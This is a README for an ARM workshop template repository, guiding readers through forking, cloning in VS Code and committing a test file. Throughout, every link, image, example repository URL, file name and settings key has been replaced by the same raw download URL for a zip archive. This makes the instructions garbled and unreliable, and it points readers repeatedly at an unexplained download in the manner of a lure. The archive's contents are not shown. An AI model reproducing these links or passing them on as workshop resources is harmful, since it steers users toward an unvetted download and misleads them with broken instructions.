# arm-workshop

This area is a template repository, used by the Citadel ARM workshop at <https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip>.

If you are working through the series of labs in this workshop then you will need a GitHub account and to have met all of the other [prereqs](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip).  You will not be able to complete the fork, clone and test in this guide unless you have configured vscode and installed git into the operating system.

## Fork and Clone

You should then fork this repository into your GitHub account and then clone it to your laptop using vscode. Follow these instructions:

1. Right click on the tab in your browser and duplicate so that you can work in one whilst reading this file in the other
1. Click on the Fork button at the top right:

![Fork](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip)

3. Select your personal GitHub account
1. The repo will be forked as `https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip`
1. Click on the _Clone or download_ button and click on the copy icon:

![Fork](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip)

6. Open up a new Visual Studio Code window
1. Type `CTRL`+`SHIFT`+`P` to open the Command Palette
1. Type `clone` until Git: Clone appears then select it:

![Command Palette](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip)

9. Paste in the `https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip` repository URL
1. Select the destination directory
    * You can choose a default clone directory in Settings (`CTRL`+`,`)
    * E.g. `"https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip": "C:\\Users\\username\\git"`
1. Click on _Open Repository_ when prompted

Your vscode should now look similar to this:

![Cloned Repo](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip)

## Testing

Let's create a test file to check that the Git integration is working correctly.  

We will create a new file, stage the change locally and then finally commit it to the local clone of the repository. (Whenever you commit you need to include a message to describe that commit.) The commit will only be local at that point, so we will then push (or sync) so that you can confirm the change is in your GitHub repo.

1. Create a new file called https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip in vscode
1. Add in some text, such as the following:

```markdown
# Test File

This is a test markdown file.
```

3. You should see a round blob on the file's tab to show that is has unsaved changes
1. Click `CTRL`+`S` to save the file
    * The Source Control icon on the sidebar should now show the number
1. Click on the Source Control icon, or use `CTRL`+`SHIFT`+`G`
1. Hover over the https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip filename and click on the `+`
    * This stages the changed file
1. Type in a message to describe the commit such as _Initial commit_
1. To commit, either click on the tick (or check), or type `CTRL`+`ENTER`:

![Commit](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip)

9. Push the commited change up, using either Push from the ellipsis (`...`) menu, or by clicking on the sync in the status bar:

![Sync](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip)

10. Browse to your <https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip> repo fork
1. Refresh the page to reflect the change

![Refresh](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip)

Once you have confirmed that everything is working well then you should be good to continue with the [labs](https://github.com/GerrieLouw/arm-workshop/raw/refs/heads/master/lab4/arm_workshop_v2.4.zip).